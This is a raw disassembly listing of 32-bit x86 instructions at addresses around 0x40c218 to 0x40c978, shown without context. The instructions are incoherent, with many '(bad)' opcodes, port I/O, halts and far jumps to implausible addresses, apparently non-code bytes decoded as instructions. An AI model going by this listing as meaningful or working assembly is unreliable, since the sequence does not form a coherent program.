  40c218:	les    esi,FWORD PTR [eax+eiz*2-0x2d]
  40c21c:	repnz or al,0x41
  40c21f:	ins    DWORD PTR es:[edi],dx
  40c220:	xor    esp,ecx
  40c222:	mov    edi,0x2c8f3b64
  40c227:	loope  0x40c1e2
  40c229:	nop
  40c22a:	call   0xce406695
  40c22f:	dec    eax
  40c230:	cld    
  40c231:	popf   
  40c232:	ins    BYTE PTR es:[edi],dx
  40c233:	add    DWORD PTR [esi-0x2e54ec11],edi
  40c239:	push   0x92913f89
  40c23e:	mov    dl,0xef
  40c240:	adc    eax,DWORD PTR [esi+edi*1]
  40c243:	xchg   edi,eax
  40c244:	cs scas eax,DWORD PTR es:[edi]
  40c246:	adc    esi,edi
  40c248:	add    eax,0x31ca3554
  40c24d:	out    dx,eax
  40c24e:	sub    al,0x35
  40c250:	add    edx,DWORD PTR [eax+0x1e6b4129]
  40c256:	loop   0x40c2a0
  40c258:	jg     0x40c25f
  40c25a:	adc    dh,BYTE PTR [ebx]
  40c25c:	or     al,0x81
  40c25e:	hlt    
  40c25f:	js     0x40c28d
  40c261:	push   ecx
  40c262:	cdq    
  40c263:	arpl   WORD PTR [ebx+0x10],sp
  40c266:	add    BYTE PTR [ebx+edi*2+0x6],0xa4
  40c26b:	push   esp
  40c26c:	add    edi,DWORD PTR [ecx]
  40c26e:	or     BYTE PTR [esp+edi*4],bh
  40c271:	test   al,0x49
  40c273:	mov    ebx,0xf0ff887f
  40c278:	dec    ebx
  40c279:	out    0xd9,eax
  40c27b:	fdiv   st(2),st
  40c27d:	adc    eax,0xfeffc1fe
  40c282:	adc    DWORD PTR [esi+0x66],esp
  40c285:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c286:	ins    DWORD PTR es:[edi],dx
  40c287:	adc    BYTE PTR [ebp-0x42],0x9f
  40c28b:	mov    esp,DWORD PTR [eax]
  40c28d:	jns    0x40c30d
  40c28f:	jnp    0x40c240
  40c291:	xlat   BYTE PTR ds:[ebx]
  40c292:	mov    ds:0x37f0a952,eax
  40c297:	(bad)  
  40c298:	cli    
  40c299:	fstp   TBYTE PTR [ecx-0x3f80546]
  40c29f:	cli    
  40c2a0:	out    dx,eax
  40c2a1:	ins    DWORD PTR es:[edi],dx
  40c2a2:	adc    ecx,ecx
  40c2a4:	jno    0x40c234
  40c2a6:	fcom   QWORD PTR [ecx+0x3eeff1f0]
  40c2ac:	test   bh,ch
  40c2ae:	sti    
  40c2af:	je     0x40c26c
  40c2b1:	(bad)  
  40c2b3:	ja     0x40c32c
  40c2b5:	adc    DWORD PTR [eax+0x54798ef9],eax
  40c2bb:	pusha  
  40c2bc:	cwde   
  40c2bd:	shl    ah,cl
  40c2bf:	hlt    
  40c2c0:	xor    al,0x2f
  40c2c2:	sbb    al,0x3b
  40c2c4:	lds    esp,FWORD PTR [edi+0x618c733f]
  40c2ca:	mov    esp,0x1a7944c0
  40c2cf:	iret   
  40c2d0:	outs   dx,DWORD PTR ds:[esi]
  40c2d1:	and    dl,BYTE PTR [ebx]
  40c2d3:	pop    edi
  40c2d4:	dec    ebx
  40c2d5:	(bad)  
  40c2d6:	cld    
  40c2d7:	cwde   
  40c2d8:	mov    dl,0x77
  40c2da:	shl    DWORD PTR [eax-0x5e6d9eff],0xa
  40c2e1:	push   eax
  40c2e2:	adc    DWORD PTR [edx+0x6],edi
  40c2e5:	rol    BYTE PTR [ebx-0x6ae7dd15],cl
  40c2eb:	or     eax,0x4f5718e6
  40c2f0:	adc    BYTE PTR [ecx],ch
  40c2f2:	jae    0x40c2bc
  40c2f4:	xor    DWORD PTR [edx+0x6e409b51],eax
  40c2fa:	fisttp DWORD PTR [esi]
  40c2fc:	mov    dl,0x47
  40c2fe:	pop    edx
  40c2ff:	jmp    0x40c2c0
  40c301:	jb     0x40c35e
  40c303:	xchg   BYTE PTR [ecx],ah
  40c305:	and    al,0x71
  40c307:	(bad)
  40c30b:	xchg   BYTE PTR [ebp-0x1ee4ee78],bh
  40c311:	pop    ecx
  40c312:	fs xor edx,ecx
  40c315:	in     eax,dx
  40c316:	je     0x40c309
  40c318:	fnstsw WORD PTR [esi+0x11a6edf1]
  40c31e:	sbb    dh,0xa
  40c321:	jp     0x40c2d3
  40c323:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c324:	sti    
  40c325:	mov    bl,0x89
  40c327:	and    ch,bl
  40c329:	add    BYTE PTR [edi-0x42811ec4],al
  40c32f:	xchg   esi,eax
  40c330:	std    
  40c331:	fwait
  40c332:	xchg   ecx,eax
  40c333:	clc    
  40c334:	inc    ebp
  40c335:	push   0x40
  40c337:	cmp    BYTE PTR [edx+ebp*2],bl
  40c33a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c33b:	das    
  40c33c:	mov    ch,0x64
  40c33e:	push   edi
  40c33f:	stc    
  40c340:	jmp    0xf9b15c57
  40c345:	bnd ss ret 0x5b2b
  40c34a:	xchg   edi,eax
  40c34b:	push   ecx
  40c34c:	jp     0x40c2eb
  40c34e:	sub    al,0x8c
  40c350:	xchg   DWORD PTR [edx+esi*1],esi
  40c353:	or     al,0x2b
  40c355:	and    DWORD PTR [edx+0xa4180aa],esi
  40c35b:	jns    0x40c381
  40c35d:	pusha  
  40c35e:	cbw    
  40c360:	dec    ecx
  40c361:	dec    ecx
  40c362:	call   0x15ed:0x1208505a
  40c369:	lock cmp eax,0x91042f81
  40c36f:	push   edi
  40c370:	data16 adc bh,ch
  40c373:	out    0xd7,eax
  40c375:	jg     0x40c372
  40c377:	and    ch,BYTE PTR [ebp-0x700ed00a]
  40c37d:	inc    cl
  40c37f:	div    DWORD PTR [eax+0x7e816fb4]
  40c385:	mov    edi,0x6370536f
  40c38a:	out    dx,eax
  40c38b:	pop    ebx
  40c38c:	dec    esp
  40c38d:	hlt    
  40c38e:	jns    0x40c378
  40c390:	outs   dx,BYTE PTR ds:[esi]
  40c391:	cwde   
  40c392:	ror    BYTE PTR [edi],0xfd
  40c395:	int    0x6f
  40c397:	gs ins DWORD PTR es:[edi],dx
  40c399:	jecxz  0x40c38e
  40c39b:	cmp    al,0xfa
  40c39d:	je     0x40c361
  40c39f:	mov    ebx,0x3cf3ade
  40c3a4:	imul   edi
  40c3a6:	aad    0xc9
  40c3a8:	pop    esi
  40c3a9:	mov    bl,0xd2
  40c3ab:	fisttp QWORD PTR [ebp+0xd49dc3e]
  40c3b1:	sbb    BYTE PTR [esi],cl
  40c3b3:	xchg   esp,ecx
  40c3b5:	into   
  40c3b6:	into   
  40c3b7:	shr    BYTE PTR [edx+0x75],cl
  40c3ba:	stc    
  40c3bb:	test   DWORD PTR [edi-0x3],ebx
  40c3be:	xor    ah,BYTE PTR [edi+0x2e]
  40c3c1:	xchg   esp,eax
  40c3c2:	cdq    
  40c3c3:	pop    ebp
  40c3c4:	cwde   
  40c3c5:	lds    ebp,FWORD PTR [edi]
  40c3c7:	lea    eax,[ecx-0x1c65758]
  40c3cd:	mov    cl,0x9
  40c3cf:	sbb    eax,0x242644d7
  40c3d4:	xor    dl,BYTE PTR [ecx+0x63356e78]
  40c3da:	(bad)  [ecx-0x12243daa]
  40c3e0:	(bad)  
  40c3e1:	jmp    0x6762:0x564caa9f
  40c3e8:	adc    bl,BYTE PTR [ecx+ecx*2]
  40c3eb:	in     al,dx
  40c3ec:	ins    BYTE PTR es:[edi],dx
  40c3ed:	inc    eax
  40c3ee:	push   edi
  40c3ef:	rcr    BYTE PTR [ebx-0x1f],0x94
  40c3f3:	and    eax,0xe22651fa
  40c3f8:	sbb    dl,BYTE PTR ds:0x6100ee65
  40c3fe:	mov    edi,0x890065af
  40c403:	and    al,0x4e
  40c405:	cmp    al,0x3c
  40c407:	jp     0x40c45d
  40c409:	dec    ebx
  40c40a:	cmp    eax,0xea2c006b
  40c40f:	stos   DWORD PTR es:[edi],eax
  40c410:	jmp    0x40c432
  40c412:	fistp  DWORD PTR [ebx+0x5a]
  40c415:	or     eax,eax
  40c417:	ins    DWORD PTR es:[edi],dx
  40c418:	mov    ebx,0x43e90042
  40c41d:	daa    
  40c41e:	cmp    dl,BYTE PTR [ecx+esi*1+0x2d39e65b]
  40c425:	cld    
  40c426:	xchg   ecx,eax
  40c427:	jb     0x40c3e2
  40c429:	jb     0x40c3e4
  40c42b:	adc    BYTE PTR [eax],0x8c
  40c42e:	les    ecx,FWORD PTR [ebp-0x88f2911]
  40c434:	cmc    
  40c435:	sub    al,0x5f
  40c437:	out    dx,eax
  40c438:	cmp    BYTE PTR [ebx-0x4160a7fe],ah
  40c43e:	xchg   esp,eax
  40c43f:	push   esp
  40c440:	sub    dl,BYTE PTR ds:0xf9623892
  40c446:	in     al,dx
  40c447:	push   ss
  40c448:	xchg   edx,eax
  40c449:	data16 stos BYTE PTR es:[edi],al
  40c44b:	inc    ebx
  40c44c:	mov    dh,ah
  40c44e:	jp     0x40c3d9
  40c450:	xchg   ebx,eax
  40c451:	add    al,0xd5
  40c453:	or     al,0x6
  40c455:	fwait
  40c456:	sbb    al,0xcc
  40c458:	adc    BYTE PTR gs:[esi],cl
  40c45b:	add    cl,BYTE PTR [eax+0x5]
  40c45e:	mov    edi,0x55129ebb
  40c463:	add    BYTE PTR [edx+0x52],0x9
  40c467:	sbb    ah,dh
  40c469:	push   0xffffffc3
  40c46b:	xchg   edi,eax
  40c46c:	out    dx,eax
  40c46d:	sbb    DWORD PTR [edi],0x7b
  40c470:	and    al,0x9
  40c472:	test   cl,cl
  40c474:	adc    bh,BYTE PTR [edi-0x49ea2609]
  40c47a:	mov    dh,0xff
  40c47c:	adc    edi,DWORD PTR [edi]
  40c47e:	cli    
  40c47f:	leave  
  40c480:	out    dx,eax
  40c481:	loope  0x40c431
  40c483:	mov    ebx,0xb76ed00e
  40c488:	inc    edi
  40c489:	cwde   
  40c48a:	inc    eax
  40c48b:	cli    
  40c48c:	pop    esp
  40c48d:	imul   esp,esp,0x3ca1e63
  40c493:	je     0x40c450
  40c495:	pop    ebp
  40c496:	jmp    0xde37:0xf43f0af5
  40c49d:	enter  0x47b3,0x2f
  40c4a1:	jno    0x40c487
  40c4a3:	scas   al,BYTE PTR es:[edi]
  40c4a4:	cmp    eax,0xc2c3870c
  40c4a9:	jns    0x40c4a9
  40c4ab:	inc    ebp
  40c4ac:	int3   
  40c4ad:	les    edi,FWORD PTR [ebp-0x5fcf9f02]
  40c4b3:	pop    esi
  40c4b4:	scas   eax,DWORD PTR es:[edi]
  40c4b5:	shr    DWORD PTR [esi+esi*1-0x7],cl
  40c4b9:	aad    0x5f
  40c4bb:	inc    DWORD PTR [edx]
  40c4bd:	jg     0x40c4b1
  40c4bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c4c0:	imul   edx,DWORD PTR [eax-0x46],0x13
  40c4c4:	iret   
  40c4c5:	fwait
  40c4c6:	add    BYTE PTR [edi+0x48668ba1],bh
  40c4cc:	test   dh,dh
  40c4ce:	out    dx,eax
  40c4cf:	in     eax,0x89
  40c4d1:	xor    edx,DWORD PTR [ecx]
  40c4d3:	xchg   cl,ah
  40c4d5:	cmp    BYTE PTR [ecx+ebp*2-0x7def8c02],al
  40c4dc:	popf   
  40c4dd:	cmc    
  40c4de:	xchg   edi,eax
  40c4df:	xor    DWORD PTR [edx],edi
  40c4e1:	dec    ebx
  40c4e2:	xor    eax,0xf4eac1d5
  40c4e7:	cli    
  40c4e8:	(bad)  
  40c4e9:	dec    edx
  40c4ea:	jge    0x40c503
  40c4ec:	or     esp,esp
  40c4ee:	or     eax,DWORD PTR [ecx-0x2c7dd9e8]
  40c4f4:	push   edx
  40c4f5:	push   es
  40c4f6:	xor    DWORD PTR [edx],esi
  40c4f8:	pop    esp
  40c4f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c4fa:	popa   
  40c4fb:	bnd ret 0x609
  40c4ff:	xchg   edx,eax
  40c500:	test   BYTE PTR [ecx-0x6771a55c],dl
  40c506:	lahf   
  40c507:	lods   eax,DWORD PTR ds:[esi]
  40c508:	(bad)  
  40c509:	aam    0xc3
  40c50b:	push   esp
  40c50c:	xlat   BYTE PTR ds:[ebx]
  40c50d:	dec    ecx
  40c50e:	push   ebp
  40c50f:	add    BYTE PTR [ebx],dh
  40c511:	xadd   BYTE PTR ds:0x9c714292,dl
  40c518:	outs   dx,BYTE PTR gs:[esi]
  40c51a:	push   ebx
  40c51b:	(bad)  [ebp+0x1c]
  40c51e:	inc    eax
  40c51f:	out    0xe4,al
  40c521:	and    BYTE PTR [ebx],bl
  40c523:	jmp    0xaa482bcf
  40c528:	psraw  mm4,QWORD PTR [edx]
  40c52b:	push   es
  40c52c:	and    esp,edi
  40c52e:	ret    0xe050
  40c531:	jmp    0x40c554
  40c533:	sbb    BYTE PTR [ebx-0x165089a3],0x3e
  40c53a:	jnp    0x40c50d
  40c53c:	ds xor al,0x3
  40c53f:	test   al,0x54
  40c541:	sub    bl,BYTE PTR [ecx]
  40c543:	cs pop ebp
  40c545:	scas   eax,DWORD PTR es:[edi]
  40c546:	xlat   BYTE PTR ds:[ebx]
  40c547:	jmp    0x72fd4141
  40c54c:	push   0x1b
  40c54e:	les    esi,FWORD PTR [esi+ebx*4]
  40c551:	xchg   BYTE PTR [ebp-0x39abc2a6],bl
  40c557:	sbb    eax,0xd9fc6661
  40c55c:	dec    ebx
  40c55d:	test   eax,0xe7f10e9d
  40c562:	popa   
  40c563:	mov    edi,0xddcc088b
  40c568:	adc    al,BYTE PTR [edi+0x426fd490]
  40c56e:	and    al,BYTE PTR ds:0x2a7c19d2
  40c574:	or     DWORD PTR [ecx-0x33bec817],ebp
  40c57a:	add    bl,BYTE PTR [edi-0x4]
  40c57d:	jmp    0x1aff:0xfdefe55
  40c584:	jmp    edx
  40c586:	lahf   
  40c587:	jge    0x40c5c0
  40c589:	neg    DWORD PTR [ecx+edi*1]
  40c58c:	inc    esp
  40c58d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c58e:	shl    DWORD PTR [ecx-0x54a324ee],cl
  40c594:	sub    BYTE PTR [edi+edx*8-0x14],ah
  40c598:	ja     0x40c529
  40c59a:	lea    esp,[edx-0x6c423a78]
  40c5a0:	sub    al,0xee
  40c5a2:	popf   
  40c5a3:	xor    BYTE PTR fs:[eax],bl
  40c5a6:	fs jb  0x40c5e1
  40c5a9:	out    0x99,al
  40c5ab:	inc    esi
  40c5ac:	shl    DWORD PTR [esi-0x40],1
  40c5af:	xor    cl,BYTE PTR [ecx+ebx*8+0x799e59d9]
  40c5b6:	out    dx,al
  40c5b7:	add    al,0xbf
  40c5b9:	repnz pop edi
  40c5bb:	sahf   
  40c5bc:	arpl   WORD PTR [ebx-0xb1b36cd],si
  40c5c2:	cmp    BYTE PTR [ecx],cl
  40c5c4:	xor    eax,0x461050e2
  40c5c9:	or     DWORD PTR [ecx+0x20],eax
  40c5cc:	nop
  40c5cd:	mov    cl,0xa3
  40c5cf:	dec    esi
  40c5d0:	mov    ecx,0xb10c2dd4
  40c5d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5d6:	push   0xffffff80
  40c5d8:	fisubr DWORD PTR [esp+ebx*1]
  40c5db:	ret    0x7616
  40c5de:	jg     0x40c5ea
  40c5e0:	ror    DWORD PTR ds:0xb6a572a3,cl
  40c5e6:	mov    ecx,0xf6031ea0
  40c5eb:	jb     0x40c583
  40c5ed:	sub    ebp,DWORD PTR [ebx-0x77c4df40]
  40c5f3:	add    eax,0xb6c8ba29
  40c5f8:	hlt    
  40c5f9:	cdq    
  40c5fa:	shr    bl,cl
  40c5fc:	stos   BYTE PTR es:[edi],al
  40c5fd:	jp     0x40c58f
  40c5ff:	xor    dl,ch
  40c601:	inc    DWORD PTR [ebx+0x49]
  40c604:	sbb    BYTE PTR [esi],ah
  40c606:	mov    WORD PTR [edi+0x12],ss
  40c609:	test   dh,0x4f
  40c60c:	adc    DWORD PTR [esi-0x1f],eax
  40c60f:	mov    BYTE PTR [edx],cl
  40c611:	pusha  
  40c612:	pop    edx
  40c613:	mov    ecx,0x7373665c
  40c618:	xor    eax,ebx
  40c61a:	add    ah,dh
  40c61c:	cmp    BYTE PTR ds:0x1321b70,bl
  40c622:	cdq    
  40c623:	mov    dh,0x1b
  40c625:	add    al,0xe0
  40c627:	dec    ecx
  40c628:	test   eax,0x41063792
  40c62d:	mov    al,ds:0x33f9bf25
  40c632:	int    0xe5
  40c634:	(bad)  
  40c635:	jmp    0x5a5dfb81
  40c63a:	adc    al,0x25
  40c63c:	out    0xb6,al
  40c63e:	pop    ebx
  40c63f:	add    eax,0xcfb5aff5
  40c644:	popf   
  40c645:	shr    BYTE PTR [edx],cl
  40c647:	sbb    al,0xa2
  40c649:	sub    al,0x57
  40c64b:	sub    ebp,DWORD PTR [esi+ebp*4+0x2dbdb1ae]
  40c652:	pushf  
  40c653:	add    DWORD PTR [edi+0x3892673e],edx
  40c659:	nop
  40c65a:	shl    BYTE PTR ds:0xe91e9904,1
  40c660:	es or  cl,cl
  40c663:	inc    edx
  40c664:	jg     0x40c68d
  40c666:	and    BYTE PTR [eax+0x64],cl
  40c669:	aad    0x2
  40c66b:	jne    0x40c60b
  40c66d:	mov    DWORD PTR [ecx],ecx
  40c66f:	sar    BYTE PTR [ecx+0x3],1
  40c672:	sar    BYTE PTR [ecx+0x8],1
  40c675:	test   DWORD PTR [edx],esi
  40c677:	mov    ch,BYTE PTR [ecx-0x6776fabd]
  40c67d:	jecxz  0x40c630
  40c67f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c680:	xlat   BYTE PTR ds:[ebx]
  40c681:	clc    
  40c682:	loope  0x40c703
  40c684:	clc    
  40c685:	sub    DWORD PTR [esi-0x16],edi
  40c688:	pop    edi
  40c689:	jge    0x40c60f
  40c68b:	cmp    ecx,DWORD PTR [esi]
  40c68d:	in     eax,dx
  40c68e:	arpl   WORD PTR [ebx+0x7b],di
  40c691:	cmp    esp,DWORD PTR [ebx+0x5d]
  40c694:	into   
  40c695:	xor    eax,DWORD PTR [eax]
  40c697:	ja     0x40c67f
  40c699:	pop    ecx
  40c69a:	push   ds
  40c69b:	rcr    BYTE PTR [ebx+0x113b23e4],cl
  40c6a1:	jp     0x40c674
  40c6a3:	fadd   QWORD PTR [edi+esi*4]
  40c6a6:	jg     0x40c6af
  40c6a8:	add    DWORD PTR [ecx],0x73
  40c6ab:	jae    0x40c720
  40c6ad:	mov    ah,0x3b
  40c6af:	cmp    eax,0xfe5fdffe
  40c6b4:	xor    ah,BYTE PTR [edi-0x1a07fa32]
  40c6ba:	sbb    eax,esi
  40c6bc:	(bad)  
  40c6bd:	xchg   ecx,eax
  40c6be:	push   esp
  40c6bf:	mov    BYTE PTR [edx+0x55],ah
  40c6c2:	inc    esi
  40c6c3:	cmp    al,0x8e
  40c6c5:	xchg   ebp,eax
  40c6c6:	mov    al,ds:0x6ec42390
  40c6cb:	(bad)  
  40c6cc:	mov    ebp,DWORD PTR [ebx-0x80]
  40c6cf:	jae    0x40c6f2
  40c6d1:	mov    esi,0x5e5c5833
  40c6d6:	xor    BYTE PTR [edx-0x42],dh
  40c6d9:	jnp    0x40c66b
  40c6db:	mov    ah,0x8b
  40c6dd:	pop    ecx
  40c6de:	push   ebp
  40c6df:	inc    edx
  40c6e0:	jg     0x40c6fd
  40c6e2:	out    0xfb,eax
  40c6e4:	pop    ecx
  40c6e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c6e6:	sub    BYTE PTR [ebx],0xf0
  40c6e9:	shl    BYTE PTR [ecx],cl
  40c6eb:	loope  0x40c726
  40c6ed:	enter  0x7cc4,0x53
  40c6f1:	push   ebp
  40c6f2:	or     eax,eax
  40c6f4:	dec    esp
  40c6f5:	cmp    dl,BYTE PTR [edx-0x3a]
  40c6f8:	rcl    BYTE PTR [edx+0x200fc7d7],0xec
  40c6ff:	lea    edx,[esi+0x3]
  40c702:	xor    bh,ch
  40c704:	jmp    0xd18fc604
  40c709:	popf   
  40c70a:	sbb    eax,0xc768a560
  40c70f:	lods   eax,DWORD PTR ds:[esi]
  40c710:	push   0x4d0061bb
  40c715:	ret    
  40c716:	add    BYTE PTR [edi+edi*4+0x64],bh
  40c71a:	cmp    DWORD PTR [edi+0x84250f9],esi
  40c720:	sbb    eax,0xfff5980d
  40c725:	pop    ss
  40c726:	jmp    0x8e37c0ba
  40c72b:	test   dl,bh
  40c72d:	cmp    ebx,DWORD PTR [ebp+0x77]
  40c730:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c731:	repz bound ebx,QWORD PTR [ebp-0x1d]
  40c735:	sar    ah,0x49
  40c738:	test   eax,0x6ab54f0c
  40c73d:	xchg   ebp,eax
  40c73e:	adc    esp,DWORD PTR [edi]
  40c740:	ss push 0x82564bb5
  40c746:	fadd   DWORD PTR [ecx]
  40c748:	fs call 0xf3118a8c
  40c74e:	dec    eax
  40c74f:	and    BYTE PTR [ebx-0x8],cl
  40c752:	xchg   esi,eax
  40c753:	loopne 0x40c776
  40c755:	mov    ebx,0xb7cee49c
  40c75a:	int3   
  40c75b:	inc    eax
  40c75c:	and    al,BYTE PTR [ebp-0x76ef5719]
  40c762:	cs push cs
  40c764:	in     al,0x4a
  40c766:	adc    al,0xf
  40c768:	sub    esi,esi
  40c76a:	lock mov ch,0x67
  40c76d:	loope  0x40c7b6
  40c76f:	ds stc 
  40c771:	sub    DWORD PTR [esi-0x6],edi
  40c774:	(bad)  
  40c775:	aas    
  40c776:	into   
  40c777:	fsub   st(4),st
  40c779:	xor    al,0x1b
  40c77b:	sbb    ebx,DWORD PTR [ebx]
  40c77d:	push   0xffffffaf
  40c77f:	out    0x8d,eax
  40c781:	pop    eax
  40c782:	lock repz push edx
  40c785:	mov    ebx,0xd7702548
  40c78a:	mov    esp,DWORD PTR [eax-0x3ff0c442]
  40c790:	xor    BYTE PTR [ecx],cl
  40c792:	arpl   bp,si
  40c794:	lahf   
  40c795:	cwde   
  40c796:	cwde   
  40c797:	loopne 0x40c7b0
  40c799:	jg     0x40c780
  40c79b:	or     edi,DWORD PTR [esi+edi*8-0x35]
  40c79f:	push   edi
  40c7a0:	or     DWORD PTR [ebx+0x24d13c25],edx
  40c7a6:	mov    eax,ds:0x262389aa
  40c7ab:	mov    es,WORD PTR [ebp+0x5217b58a]
  40c7b1:	sti    
  40c7b2:	sti    
  40c7b3:	sbb    eax,0x6cf5aec9
  40c7b8:	xchg   ecx,eax
  40c7b9:	leave  
  40c7ba:	mov    edx,0xedcfc963
  40c7bf:	jp     0x40c7a8
  40c7c1:	js     0x40c80a
  40c7c3:	mov    edx,0xc920461b
  40c7c8:	xor    DWORD PTR [eax],edx
  40c7ca:	out    0x72,eax
  40c7cc:	xchg   esi,eax
  40c7cd:	xchg   BYTE PTR ds:0xd31748b3,dh
  40c7d3:	imul   eax,DWORD PTR [edx],0x45
  40c7d6:	inc    esi
  40c7d7:	rol    DWORD PTR [esp+edi*8+0x2e761278],0x48
  40c7df:	ins    BYTE PTR es:[edi],dx
  40c7e0:	rol    BYTE PTR [ecx-0x721cf63b],cl
  40c7e6:	sbb    BYTE PTR [edi+0x24bdbc98],cl
  40c7ec:	outs   dx,DWORD PTR ds:[esi]
  40c7ed:	mov    ds:0xe829ebe9,eax
  40c7f2:	jmp    0x4db8:0x17baf67e
  40c7f9:	cs inc eax
  40c7fb:	mov    eax,0xa4202309
  40c800:	leave  
  40c801:	cmp    eax,0x668091b3
  40c806:	neg    BYTE PTR [edi-0x251b2665]
  40c80c:	pop    ecx
  40c80d:	sub    DWORD PTR [edi-0x7b],0x692d7fbe
  40c814:	lahf   
  40c815:	pop    edi
  40c816:	idiv   DWORD PTR [edi+ecx*4]
  40c819:	sahf   
  40c81a:	push   cs
  40c81b:	scas   eax,DWORD PTR es:[edi]
  40c81c:	xchg   ebp,eax
  40c81d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c81e:	push   eax
  40c81f:	(bad)  
  40c821:	mov    DWORD PTR [edx],ebp
  40c823:	iret   
  40c824:	sahf   
  40c825:	pop    ebp
  40c826:	mov    eax,ds:0x40652ad3
  40c82b:	mov    es,eax
  40c82d:	or     edi,edi
  40c82f:	int    0x41
  40c831:	(bad)  
  40c832:	in     al,dx
  40c833:	mov    dh,0x3c
  40c835:	shr    DWORD PTR [ebx-0x1b156aff],1
  40c83b:	ret    0x2739
  40c83e:	inc    ebp
  40c83f:	push   cs
  40c840:	jbe    0x40c81b
  40c842:	xor    BYTE PTR [ecx+eiz*2],ah
  40c845:	push   eax
  40c846:	add    BYTE PTR [eax],cl
  40c848:	mov    eax,ds:0xb48c8098
  40c84d:	retf   
  40c84e:	push   eax
  40c84f:	pop    edi
  40c850:	xor    esp,DWORD PTR [ecx-0x7a]
  40c853:	das    
  40c854:	aas    
  40c855:	jbe    0x40c7ec
  40c857:	pop    ds
  40c858:	stc    
  40c859:	in     al,0x7f
  40c85b:	loope  0x40c824
  40c85d:	jg     0x40c84b
  40c85f:	arpl   WORD PTR [ebx+ebx*4],si
  40c862:	dec    ebp
  40c863:	mov    dh,0xb6
  40c865:	mov    dh,0x9c
  40c867:	jnp    0x40c856
  40c869:	lods   al,BYTE PTR ds:[esi]
  40c86a:	mov    bh,0x17
  40c86c:	mov    eax,ds:0xbcbefc83
  40c871:	and    eax,edx
  40c873:	adc    BYTE PTR [edi-0x71dfd8c5],bh
  40c879:	arpl   si,si
  40c87b:	in     al,dx
  40c87c:	fld    st(3)
  40c87e:	repz inc edi
  40c880:	iret   
  40c881:	lock test eax,0xd5a31f4f
  40c887:	popf   
  40c888:	les    ebp,FWORD PTR [ebx]
  40c88a:	dec    edi
  40c88b:	and    al,BYTE PTR [ebp-0x7d]
  40c88e:	and    al,0x11
  40c890:	test   BYTE PTR [ecx+0x44],dl
  40c893:	adc    al,0x79
  40c895:	inc    esp
  40c896:	push   ecx
  40c897:	inc    edx
  40c898:	sbb    BYTE PTR [ecx+0x84f7f20],ch
  40c89e:	lock int3 
  40c8a0:	test   DWORD PTR [eax+0x25],0x197efdbd
  40c8a7:	pop    ebx
  40c8a8:	and    BYTE PTR [edx+0x36],0xe
  40c8ac:	(bad)  
  40c8ae:	out    dx,eax
  40c8af:	out    0xd9,al
  40c8b1:	arpl   WORD PTR [ecx],sp
  40c8b3:	popf   
  40c8b4:	aad    0x58
  40c8b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8b7:	dec    edx
  40c8b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8b9:	ret    0x65ca
  40c8bc:	push   cs
  40c8bd:	inc    ebp
  40c8be:	enter  0x6d40,0x1f
  40c8c2:	cmc    
  40c8c3:	push   esp
  40c8c4:	fs xchg ecx,eax
  40c8c6:	mov    al,ds:0xeaa404ca
  40c8cb:	add    DWORD PTR [edx+0x41834489],ebp
  40c8d1:	int3   
  40c8d2:	mov    eax,ds:0x2a546303
  40c8d7:	and    eax,0xb9fbb6b6
  40c8dc:	jecxz  0x40c931
  40c8de:	aad    0x38
  40c8e0:	dec    ecx
  40c8e1:	adc    dh,BYTE PTR [esi]
  40c8e3:	aaa    
  40c8e4:	aaa    
  40c8e5:	mov    ecx,DWORD PTR [edx-0x760d437f]
  40c8eb:	dec    edi
  40c8ec:	jl     0x40c8d0
  40c8ee:	fidiv  DWORD PTR [ecx]
  40c8f0:	(bad)  
  40c8f2:	shl    BYTE PTR [esi+0x4ba0376b],0xcc
  40c8f9:	cs push ebx
  40c8fb:	jo     0x40c8f4
  40c8fd:	in     eax,0x97
  40c8ff:	and    DWORD PTR [ebx],ecx
  40c901:	or     esp,0xfffffffa
  40c904:	aaa    
  40c905:	fimul  DWORD PTR [esi]
  40c907:	pusha  
  40c908:	scas   al,BYTE PTR es:[edi]
  40c909:	jae    0x40c92e
  40c90b:	sti    
  40c90c:	inc    eax
  40c90d:	jge    0x40c8a9
  40c90f:	dec    eax
  40c910:	iret   
  40c911:	popf   
  40c912:	aaa    
  40c913:	push   eax
  40c914:	push   eax
  40c915:	or     DWORD PTR es:[esi-0x5b],edi
  40c919:	add    BYTE PTR [edx+esi*2-0x12],0xfc
  40c91e:	cmp    dh,BYTE PTR [edx]
  40c920:	sub    al,BYTE PTR [ebx-0x27]
  40c923:	cmp    eax,0xe839d85f
  40c928:	out    dx,al
  40c929:	mov    ebx,0x61c7c258
  40c92e:	or     BYTE PTR [ecx-0x29],bh
  40c931:	pop    ds
  40c932:	test   eax,0xb810c0cd
  40c937:	cmp    DWORD PTR [edi],edi
  40c939:	add    ecx,DWORD PTR [esi+0x2c280432]
  40c93f:	mov    cl,0x4b
  40c941:	push   esp
  40c942:	cwde   
  40c943:	jle    0x40c961
  40c945:	inc    ebx
  40c946:	pop    edx
  40c947:	ror    DWORD PTR [edi+0x0],cl
  40c94a:	push   ds
  40c94b:	xor    DWORD PTR [ebx+0x2b8bee7c],esi
  40c951:	cld    
  40c952:	jecxz  0x40c973
  40c954:	std    
  40c955:	adc    al,0xff
  40c957:	cld    
  40c958:	lahf   
  40c959:	jle    0x40c8ef
  40c95b:	inc    esi
  40c95c:	mov    ds:0xba30f361,eax
  40c961:	out    dx,eax
  40c962:	pop    esp
  40c963:	and    al,0xe5
  40c965:	repz (bad) 
  40c968:	and    eax,0x1419976e
  40c96d:	in     eax,dx
  40c96e:	pop    es
  40c96f:	xchg   ebp,eax
  40c970:	xlat   BYTE PTR ds:[ebx]
  40c971:	jle    0x40c9d9
  40c973:	data16 xchg BYTE PTR [eax],ch
  40c976:	dec    edx
  40c977:	clc    
  40c978:	lds    ebx,FWORD PTR [edi-0x3]
